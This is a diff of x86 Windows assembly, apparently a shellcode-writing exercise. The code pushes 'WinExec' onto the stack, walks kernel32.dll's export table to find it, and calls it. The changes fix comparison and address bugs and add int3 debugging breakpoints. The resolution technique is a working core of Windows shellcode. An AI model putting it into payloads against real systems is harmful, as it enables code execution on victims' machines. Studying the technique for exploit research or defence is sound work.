@@ -1,8 +1,5 @@
-format PE console
-use32
-entry .start
-
-.start:
+start:
+	int3
 ; Establish a new stack frame
 	push ebp
 	mov ebp, esp
@@ -12,9 +9,8 @@ entry .start
 ; Push the function name on the stack
 	xor esi, esi
 	push esi	; null temrinator
-	push 63h
-	push 6578h
-	push 456e6957h
+	push 636578h		; cxe
+	push 456e6957h		; EniW
 	mov [ebp-4], esp	; var4= WinExec\x00
 
 ; Find Kernel32.dll
@@ -61,8 +57,8 @@ entry .start
 	mov edx, [eax + 14h]	; Number of exported functions
 
 	xor eax, eax		; counter = 0
-
-.loop:
+	int3
+loop:
 
 	mov edi, [ebp-10h]	; edi = var16 = Adress of Name Pointer Table
 	mov esi, [ebp-4]	; esi = var4 = "WinExec\x00"
@@ -73,26 +69,31 @@ entry .start
 				; edi = RVA Nth entry = Address of Name Table * 4
 	add edi, ebx		; edi = address of string = base address + RVA Nth entry
 	add cx, 8		; Length of strings to compare (len('WinExec') = 8)
-	cmpsb			; Compare the first 8 bytes of strings in
-				; esi and edi registers. ZF=1 if equal ZF = 0 if not
-	jz .found
 	
+	mov ecx,[esi]
+	cmp ecx,[edi]
+	jne not_found
+	mov ecx, [esi+4]
+	cmp ecx, [edi+4]
+	je found		; Compare the first 8 bytes of strings in
+				; esi and edi registers. ZF=1 if equal ZF = 0 if not
+	; jz found
+not_found:	
 	inc eax			; counter++
 	cmp eax, edx		; check if last function is reached
-	jb .loop		; if not the last -> loop
+	jb loop		; if not the last -> loop
 
 	add esp, 26h
-	jmp .end		; if function is not found, jump to end
-
-.found:
+	jmp end		; if function is not found, jump to end
+found:
+	int3
 	; the counter (eax) now hold the position of WinExec
 
 	mov ecx, [ebp-0ch]	; ecx = var12 = Address of Ordinal Table
 	mov edx, [ebp-14h]	; edx = var20 = Address of Address Table
-
-	mov ax, [ecx + eax*2]	; ax = ordinal number = var12 + (counter *2)
+	movzx ax, word [ecx + eax*2]	; ax = ordinal number = var12 + (counter *2)
 	mov eax, [edx + eax*4]	; edx = RVA of function = var23 + (ordinal * 4)
-	mov eax, ebx		; eax = address of WinExec =
+	add eax, ebx		; eax = address of WinExec =
 				; kernel32.dll base address + RVA of WinExec
 
 ; Call the function
@@ -114,7 +115,7 @@ entry .start
 
 	add esp, 46h
 
-.end:
+end:
 	pop ebp
 	pop edi
 	pop esi
